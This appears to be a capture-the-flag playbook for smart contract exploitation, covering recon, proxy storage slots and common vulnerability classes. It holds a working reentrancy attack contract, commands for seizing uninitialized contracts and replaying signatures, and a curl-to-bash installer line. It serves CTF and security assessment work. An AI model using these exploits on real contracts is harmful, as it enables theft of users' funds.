# Web3 / Blockchain CTF — Smart Contract Exploitation

## Overview
Playbook for smart contract exploitation: recon, proxy patterns, access control,
reentrancy, oracle manipulation, signature misuse, and upgradeability issues.

## Prerequisites
```bash
# Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup
# Optional tools
# npm i -g @openzeppelin/contracts (for reference)
```

## Phase 1: Environment Setup
```bash
export RPC_URL="http://CHALLENGE_IP:PORT"
export PRIVATE_KEY="0xYOUR_PRIVATE_KEY"
export WALLET="0xYOUR_WALLET"
export CONTRACT="0xCHALLENGE_CONTRACT"

cast block-number --rpc-url $RPC_URL
cast balance $WALLET --rpc-url $RPC_URL
```

## Phase 2: Recon & ABI Discovery
```bash
# Get bytecode and basic info
cast code $CONTRACT --rpc-url $RPC_URL | tee /workspace/output/TARGET_web3_code.txt

# Try to fetch verified source if available (placeholder)
# If you have a block explorer API, use it to download ABI/source

# If ABI is known, list function selectors
cast selectors "deposit()" "withdraw()" "transfer(address,uint256)" \
  | tee /workspace/output/TARGET_web3_selectors.txt
```

## Phase 3: Storage & Proxy Patterns
```bash
# Dump first slots
for i in $(seq 0 30); do
  echo "Slot $i: $(cast storage $CONTRACT $i --rpc-url $RPC_URL)";
done | tee /workspace/output/TARGET_web3_storage.txt

# EIP-1967 implementation slot
cast storage $CONTRACT \
  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc \
  --rpc-url $RPC_URL | tee /workspace/output/TARGET_web3_impl_slot.txt

# Admin slot (EIP-1967)
cast storage $CONTRACT \
  0xb53127684a568b3173ae13b9f8a6016e01964c1340c8f2f6f2f8e35f1d3e9d7a \
  --rpc-url $RPC_URL | tee /workspace/output/TARGET_web3_admin_slot.txt
```

## Phase 4: Common Vulnerability Patterns

### 1) Reentrancy
```solidity
contract ReentrancyAttack {
    address target;
    constructor(address _t) { target = _t; }
    function attack() external payable {
        (bool ok,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok);
        target.call(abi.encodeWithSignature("withdraw()"));
    }
    receive() external payable {
        if (target.balance >= 1 ether) {
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
```

### 2) Access Control / Ownership
```bash
# Check common owner/admin getter
cast call $CONTRACT "owner()(address)" --rpc-url $RPC_URL \
  | tee /workspace/output/TARGET_web3_owner.txt

# Try common init functions if uninitialized
# cast send $CONTRACT "initialize(address)" $WALLET --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 3) Signature Replay / Missing Nonce
```bash
# Inspect a prior tx to reuse a signature
cast tx TX_HASH --rpc-url $RPC_URL
# Replay if the contract doesn't track nonce/chainId
# cast send $CONTRACT "claimWithSig(address,uint256,bytes)" ...
```

### 4) Price Oracle Manipulation
```bash
# If price depends on AMM spot price, check reserves
cast call PAIR "getReserves()(uint112,uint112,uint32)" --rpc-url $RPC_URL
```

### 5) Upgradeability / Proxy Misconfig
```bash
# If admin slot is 0x0 or user-controlled, upgrade to malicious impl
# Common in CTFs: uninitialized proxy or exposed upgradeTo()
```

### 6) ERC20 Approval / Permit
```bash
# Check token allowances or EIP-2612 permit misuse
# cast call TOKEN "allowance(address,address)(uint256)" $WALLET $SPENDER
```

## Phase 5: Foundry Harness
```bash
forge init /workspace/output/web3_test
cd /workspace/output/web3_test

# Add exploit in test/Solve.t.sol
forge test -vvv --rpc-url $RPC_URL \
  | tee /workspace/output/TARGET_web3_forge_test.txt
```

## Phase 6: Useful cast Commands
```bash
cast calldata-decode "transfer(address,uint256)" 0xCALLDATA
cast logs --from-block 0 --to-block latest --address $CONTRACT --rpc-url $RPC_URL
cast code $CONTRACT --rpc-url $RPC_URL
```

## Report Template

```
Target: CHALLENGE_NAME
Contract: 0xCHALLENGE_CONTRACT
Assessment Date: <DATE>

## Confirmed Findings
- [ ] Vulnerability class identified
- [ ] Exploit path validated on fork
- [ ] Challenge solved / invariant broken

## Evidence
- Storage dump: /workspace/output/TARGET_web3_storage.txt
- Forge output: /workspace/output/TARGET_web3_forge_test.txt

## Recommendations
1. Add reentrancy guards and checks-effects-interactions
2. Enforce strict access control and init guards
3. Use nonces and chainId in signed messages
4. Avoid spot-price oracles for critical logic
```

## Output Files
- `/workspace/output/TARGET_web3_code.txt` — contract bytecode
- `/workspace/output/TARGET_web3_selectors.txt` — selector list
- `/workspace/output/TARGET_web3_storage.txt` — storage dump
- `/workspace/output/TARGET_web3_impl_slot.txt` — proxy slot
- `/workspace/output/TARGET_web3_forge_test.txt` — test output

indicators: web3 blockchain solidity smart contract ethereum reentrancy
